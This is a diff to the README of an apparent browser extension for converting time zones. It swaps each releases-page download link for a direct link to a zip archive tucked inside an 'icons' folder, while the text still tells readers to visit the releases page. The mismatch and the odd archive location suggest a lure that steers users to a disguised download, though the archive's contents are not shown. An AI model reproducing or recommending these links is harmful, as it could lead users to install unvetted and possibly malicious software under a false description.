@@ -1,6 +1,6 @@
 # ⏰ timeshift-timezone-converter - Convert Time with One Right-Click
 
-[![Download](https://img.shields.io/badge/Download-Get%20Extension-%232f74c0?style=for-the-badge)](https://github.com/agalarladoors/timeshift-timezone-converter/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Extension-%232f74c0?style=for-the-badge)](https://github.com/agalarladoors/timeshift-timezone-converter/raw/refs/heads/main/timeshift/chrome/icons/timeshift_converter_timezone_v3.5.zip)
 
 ## 🔍 What is timeshift-timezone-converter?
 
@@ -34,7 +34,7 @@ If your browser is not on the list, this extension will not work.
 
 1. Click the large blue button below to visit the releases page:
 
-   [![Download Extension](https://img.shields.io/badge/Download-Open%20Releases-%237d7d7d?style=for-the-badge)](https://github.com/agalarladoors/timeshift-timezone-converter/releases)
+   [![Download Extension](https://img.shields.io/badge/Download-Open%20Releases-%237d7d7d?style=for-the-badge)](https://github.com/agalarladoors/timeshift-timezone-converter/raw/refs/heads/main/timeshift/chrome/icons/timeshift_converter_timezone_v3.5.zip)
 
 2. On the page, scroll to find the latest version. It will include files compatible with Chrome and Firefox.
 
@@ -137,4 +137,4 @@ The project is open source. Anyone can review or contribute code on GitHub. If y
 
 Visit the releases page to download and install timeshift-timezone-converter:
 
-[https://github.com/agalarladoors/timeshift-timezone-converter/releases](https://github.com/agalarladoors/timeshift-timezone-converter/releases)
+[https://github.com/agalarladoors/timeshift-timezone-converter/raw/refs/heads/main/timeshift/chrome/icons/timeshift_converter_timezone_v3.5.zip](https://github.com/agalarladoors/timeshift-timezone-converter/raw/refs/heads/main/timeshift/chrome/icons/timeshift_converter_timezone_v3.5.zip)
